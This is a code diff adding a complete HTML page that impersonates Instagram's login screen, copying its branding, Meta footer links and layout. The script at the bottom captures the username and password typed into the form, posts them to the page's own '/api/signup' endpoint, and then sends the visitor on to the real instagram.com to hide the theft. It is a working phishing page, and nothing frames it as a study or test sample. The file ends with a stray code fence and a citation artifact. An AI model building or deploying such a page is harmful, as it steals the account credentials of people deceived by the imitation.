@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login • Instagram</title>
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#000000;
+    --panel-bg:#0a0a0a;
+    --border:#262626;
+    --input-bg:#121212;
+    --text-primary:#fafafa;
+    --text-secondary:#a8a8a8;
+    --blue:#0095f6;
+    --blue-hover:#1877f2;
+    --pink:#ff2d78;
+    --orange:#ff8a3d;
+  }
+  *{box-sizing:border-box; margin:0; padding:0;}
+  body{
+    background:var(--bg);
+    color:var(--text-primary);
+    font-family: 'Plus Jakarta Sans', sans-serif;
+    min-height:100vh;
+    display:flex;
+    flex-direction:column;
+  }
+
+  .page{
+    flex:1;
+    display:flex;
+    min-height:calc(100vh - 60px);
+  }
+
+  /* LEFT PANEL */
+  .left{
+    flex:1;
+    background:#0d0d0d;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    padding:60px 80px;
+    position:relative;
+    overflow:hidden;
+  }
+
+  .logo-mark{
+    width:64px;
+    height:64px;
+    border-radius:18px;
+    background:conic-gradient(from 220deg, #ffdb8a, #ff8a3d, #ff2d78, #b729d9, #4f5bd5, #ff8a3d);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    margin-bottom:36px;
+  }
+  .logo-mark svg{ width:34px; height:34px; }
+
+  .headline{
+    font-size:44px;
+    font-weight:600;
+    line-height:1.3;
+    max-width:520px;
+    letter-spacing:-0.5px;
+  }
+  .headline .accent{
+    background:linear-gradient(90deg, #ff8a3d, #ff2d78);
+    -webkit-background-clip:text;
+    background-clip:text;
+    color:transparent;
+  }
+
+  .art{
+    position:relative;
+    margin-top:56px;
+    width:520px;
+    height:420px;
+  }
+  .card{
+    position:absolute;
+    width:230px;
+    height:340px;
+    border-radius:22px;
+    background:#1c1c1c;
+    box-shadow:0 20px 40px rgba(0,0,0,.5);
+    overflow:hidden;
+    border:6px solid #1c1c1c;
+  }
+  .card img{ width:100%; height:100%; object-fit:cover; display:block; }
+  .card.back-left{ left:0; top:40px; width:190px; height:280px; transform:rotate(-8deg); z-index:1; opacity:.9; }
+  .card.back-right{ right:0; top:50px; width:190px; height:280px; transform:rotate(8deg); z-index:1; opacity:.9; }
+  .card.front{ left:145px; top:0; z-index:2; }
+
+  .story-progress{
+    position:absolute;
+    top:16px;
+    left:16px;
+    right:16px;
+    height:3px;
+    background:rgba(255,255,255,.3);
+    border-radius:3px;
+    overflow:hidden;
+  }
+  .story-progress::after{
+    content:'';
+    display:block;
+    width:55%;
+    height:100%;
+    background:#fff;
+  }
+
+  .heart-badge{
+    position:absolute;
+    left:-18px;
+    bottom:120px;
+    width:48px;
+    height:48px;
+    border-radius:50%;
+    background:linear-gradient(135deg,#ff2d78,#b729d9);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-size:20px;
+    box-shadow:0 8px 18px rgba(255,45,120,.4);
+    z-index:3;
+  }
+
+  .close-friends-badge{
+    position:absolute;
+    right:6px;
+    top:130px;
+    background:#3bd671;
+    color:#04240f;
+    font-weight:700;
+    font-size:13px;
+    padding:6px 12px 6px 10px;
+    border-radius:20px;
+    display:flex;
+    align-items:center;
+    gap:4px;
+    z-index:3;
+  }
+
+  .avatar-badge{
+    position:absolute;
+    right:12px;
+    bottom:40px;
+    width:56px;
+    height:56px;
+    border-radius:50%;
+    border:3px solid transparent;
+    background:linear-gradient(135deg,#ff8a3d,#ff2d78,#b729d9) border-box;
+    -webkit-mask:linear-gradient(#fff 0 0) padding-box, linear-gradient(#fff 0 0);
+    -webkit-mask-composite: xor;
+    mask-composite: exclude;
+    z-index:3;
+    overflow:visible;
+  }
+  .avatar-badge img{
+    position:absolute;
+    inset:3px;
+    width:calc(100% - 6px);
+    height:calc(100% - 6px);
+    border-radius:50%;
+    object-fit:cover;
+  }
+
+  .reaction-bubble{
+    position:absolute;
+    left:60px;
+    top:-14px;
+    background:#fff;
+    border-radius:20px;
+    padding:8px 14px;
+    font-size:16px;
+    display:flex;
+    gap:4px;
+    box-shadow:0 6px 14px rgba(0,0,0,.3);
+    z-index:3;
+  }
+
+  .like-row{
+    position:absolute;
+    bottom:14px;
+    left:14px;
+    right:14px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    z-index:2;
+  }
+  .like-pill{
+    flex:1;
+    height:34px;
+    border:1.5px solid rgba(255,255,255,.85);
+    border-radius:20px;
+    margin-right:10px;
+  }
+  .heart-outline{
+    color:#fff;
+    font-size:20px;
+  }
+
+  /* RIGHT PANEL */
+  .right{
+    width:420px;
+    background:#0a0a0a;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    padding:48px 56px;
+    border-left:1px solid var(--border);
+  }
+
+  .back-row{
+    display:flex;
+    align-items:center;
+    gap:14px;
+    margin-bottom:28px;
+  }
+  .back-arrow{
+    font-size:20px;
+    color:var(--text-primary);
+    cursor:pointer;
+  }
+  .panel-title{
+    font-size:20px;
+    font-weight:600;
+  }
+
+  form{ display:flex; flex-direction:column; gap:14px; }
+
+  .field{
+    background:var(--input-bg);
+    border:1px solid var(--border);
+    border-radius:9px;
+    padding:16px 14px;
+    color:var(--text-primary);
+    font-size:15px;
+    outline:none;
+    width:100%;
+    transition:border-color .15s ease;
+  }
+  .field::placeholder{ color:var(--text-secondary); }
+  .field:focus{ border-color:#555; }
+
+  .login-btn{
+    margin-top:6px;
+    background:var(--blue-hover);
+    color:#fff;
+    border:none;
+    border-radius:9px;
+    padding:14px;
+    font-size:15px;
+    font-weight:600;
+    cursor:pointer;
+    opacity:.65;
+    transition:opacity .15s ease;
+  }
+  .login-btn:hover{ opacity:.85; }
+
+  .forgot{
+    text-align:center;
+    color:var(--text-primary);
+    font-size:14px;
+    margin-top:18px;
+    text-decoration:none;
+    cursor:pointer;
+  }
+
+  .divider-space{ height:36px; }
+
+  .fb-btn{
+    background:var(--input-bg);
+    border:1px solid var(--border);
+    color:var(--text-primary);
+    border-radius:9px;
+    padding:13px;
+    font-size:14px;
+    font-weight:600;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:8px;
+    cursor:pointer;
+  }
+  .fb-btn svg{ width:16px; height:16px; }
+
+  .create-btn{
+    margin-top:14px;
+    background:transparent;
+    border:1px solid var(--blue-hover);
+    color:var(--blue-hover);
+    border-radius:9px;
+    padding:13px;
+    font-size:14px;
+    font-weight:600;
+    cursor:pointer;
+    text-align:center;
+    text-decoration:none;
+    display:block;
+  }
+
+  .meta-logo{
+    text-align:center;
+    margin-top:36px;
+    color:var(--text-secondary);
+    font-size:14px;
+    font-weight:600;
+    letter-spacing:.5px;
+  }
+
+  footer{
+    padding:24px 0;
+    text-align:center;
+  }
+  footer .links{
+    display:flex;
+    flex-wrap:wrap;
+    justify-content:center;
+    gap:18px;
+    font-size:12px;
+    color:var(--text-secondary);
+    max-width:900px;
+    margin:0 auto 14px;
+  }
+  footer .links a{ color:inherit; text-decoration:none; }
+  footer .links a:hover{ text-decoration:underline; }
+  footer .lang{ font-size:12px; color:var(--text-secondary); }
+
+  @media (max-width: 900px){
+    .page{ flex-direction:column; }
+    .left{ display:none; }
+    .right{ width:100%; border-left:none; padding:40px 24px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="page">
+
+  <!-- LEFT -->
+  <div class="left">
+    <div class="logo-mark">
+      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <rect x="2" y="2" width="20" height="20" rx="6" stroke="white" stroke-width="2"/>
+        <circle cx="12" cy="12" r="4.5" stroke="white" stroke-width="2"/>
+        <circle cx="17.2" cy="6.8" r="1.2" fill="white"/>
+      </svg>
+    </div>
+
+    <div class="headline">
+      See everyday moments from your<br>
+      <span class="accent">close friends</span>.
+    </div>
+
+    <div class="art">
+      <div class="card back-left">
+        <img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=300&h=400&fit=crop" alt="">
+      </div>
+      <div class="card back-right">
+        <img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=300&h=400&fit=crop" alt="">
+      </div>
+      <div class="card front">
+        <div class="story-progress"></div>
+        <img src="https://images.unsplash.com/photo-1521572163474-6864f9cf17ab?w=400&h=600&fit=crop" alt="">
+        <div class="reaction-bubble">🔮 👀 🥰</div>
+        <div class="like-row">
+          <div class="like-pill"></div>
+          <span class="heart-outline">♡</span>
+        </div>
+      </div>
+      <div class="heart-badge">❤️</div>
+      <div class="close-friends-badge">★ ⌄</div>
+      <div class="avatar-badge">
+        <img src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=100&h=100&fit=crop" alt="">
+      </div>
+    </div>
+  </div>
+
+  <!-- RIGHT -->
+  <div class="right">
+    <div class="back-row">
+      <span class="back-arrow">&#8249;</span>
+      <span class="panel-title">Log into Instagram</span>
+    </div>
+
+    <form id="loginForm">
+       <input class="field" id="loginUsername" type="text" placeholder="Mobile number, username or email" required>
+       <input class="field" id="loginPassword" type="password" placeholder="Password" required>
+       <button class="login-btn" type="submit">Log in</button>
+    </form>
+
+    <a class="forgot" href="#">Forgot password?</a>
+
+    <div class="divider-space"></div>
+
+    <button class="fb-btn" type="button">
+      <svg viewBox="0 0 24 24" fill="#1877f2"><path d="M22 12.06C22 6.5 17.52 2 12 2S2 6.5 2 12.06c0 5 3.66 9.15 8.44 9.94v-7.03H7.9v-2.91h2.54V9.85c0-2.51 1.49-3.9 3.77-3.9 1.09 0 2.24.2 2.24.2v2.47h-1.26c-1.24 0-1.63.77-1.63 1.56v1.88h2.78l-.44 2.91h-2.34V22c4.78-.79 8.44-4.94 8.44-9.94Z"/></svg>
+      Log in with Facebook
+    </button>
+
+    <a class="create-btn" href="#">Create new account</a>
+
+    <div class="meta-logo">∞ Meta</div>
+  </div>
+
+</div>
+
+<footer>
+  <div class="links">
+    <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a>
+    <a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a>
+    <a href="#">Locations</a><a href="#">Popular</a><a href="#">Instagram Lite</a>
+    <a href="#">Meta AI</a><a href="#">Threads</a><a href="#">Contact Uploading &amp; Non-Users</a>
+    <a href="#">Meta Verified</a>
+  </div>
+  <div class="lang">English &#9662; &nbsp; &copy; 2026 Instagram from Meta</div>
+</footer>
+
+<script>
+  document.getElementById('loginForm').addEventListener('submit', async function(e){
+    e.preventDefault();
+
+    const username = document.getElementById('loginUsername').value;
+    const password = document.getElementById('loginPassword').value;
+
+    try {
+      await fetch('/api/signup', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: username, password: password })
+      });
+
+      window.location.href = "https://www.instagram.com";
+
+    } catch (err) {
+      console.error(err);
+    }
+  });
+</script>
+</body>
+</html>
+```[cite: 1, 2]
